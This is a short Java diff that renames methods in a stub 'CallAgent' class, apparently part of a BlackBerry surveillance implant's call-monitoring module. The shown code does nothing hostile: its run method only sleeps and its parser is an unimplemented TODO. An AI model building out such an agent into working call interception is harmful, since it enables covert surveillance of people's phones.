@@ -13,22 +13,22 @@ import com.ht.rcs.blackberry.utils.DebugLevel;
 public class CallAgent extends Agent {
     private static Debug debug = new Debug("CallAgent", DebugLevel.VERBOSE);
 
-    public CallAgent(int AgentStatus) {
-        super(Agent.AGENT_CALL, AgentStatus, true);
+    public CallAgent(int agentStatus) {
+        super(Agent.AGENT_CALL, agentStatus, true);
     }
 
-    protected CallAgent(int AgentStatus, byte[] confParams) {
-        this(AgentStatus);
-        Parse(confParams);
+    protected CallAgent(int agentStatus, byte[] confParams) {
+        this(agentStatus);
+        parse(confParams);
     }
 
-    public void AgentRun() {
+    public void agentRun() {
         debug.trace("run");
 
-        this.SleepUntilStopped();
+        this.sleepUntilStopped();
     }
 
-    protected boolean Parse(byte[] confParameters) {
+    protected boolean parse(byte[] confParameters) {
         // TODO Auto-generated method stub
         return false;
     }
